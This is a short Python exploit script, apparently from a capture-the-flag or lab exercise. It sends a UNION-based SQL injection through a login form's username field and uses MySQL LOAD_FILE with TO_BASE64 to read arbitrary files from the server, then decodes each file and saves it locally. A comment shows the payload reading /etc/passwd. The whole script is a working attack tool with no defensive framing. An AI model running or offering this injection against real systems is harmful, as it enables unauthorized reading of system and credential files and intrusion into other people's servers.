import requests
import sys
import re
import os
import base64
url = sys.argv[1]
payload = sys.argv[2]

regex = re.compile(r"admin(.*)</h3>", re.DOTALL)
#union select 1,LOAD_FILE("/etc/passwd"),3,4,5,6-- -
data = {"uname":f"admin' union select 1,TO_BASE64(LOAD_FIlE(\"{payload}\")),3,4,5,6-- -","password":"Hello Mr j"}

r = requests.post(url , data=data)
match = re.search(regex, r.text)

fname = url.replace("/", "_")[1:]

if not os.path.exists('files'):
    os.mkdir('files')
    print('Created Directory')
try:
    if match.group(1) != 'None':
        with open('files/'+fname,'w') as f:
            output= base64.b64decode(match.group(1)+ '=' * (-len(match.group(1)) % 4))
            #print(output)
            #f.write(match.group(1))
            f.write(output.decode())
except OSError:
    print('Text is so long')
except AttributeError:
    pass

#print(r.text)
#if match.group(1) !=None:
#    print(match.group(1))
#    print('Success')
#else:
#    print('Fail')
